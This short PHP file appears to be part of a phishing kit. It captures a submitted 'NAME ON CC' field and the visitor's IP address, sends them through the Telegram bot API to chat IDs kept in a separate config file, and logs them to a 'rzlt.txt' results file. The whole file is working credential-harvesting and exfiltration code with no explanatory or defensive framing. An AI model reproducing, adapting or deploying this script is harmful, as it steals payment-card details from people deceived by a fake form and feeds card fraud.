<?php
include "id.php";

if (isset($_POST['inputValue'])) {
    $ip = getenv("REMOTE_ADDR");
    $inputValue = $_POST['inputValue'];



           $message = "| NAME ON CC :  : ".$inputValue."
|IP      : ".$ip."";



foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot' . $bot . '/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
} 
?>
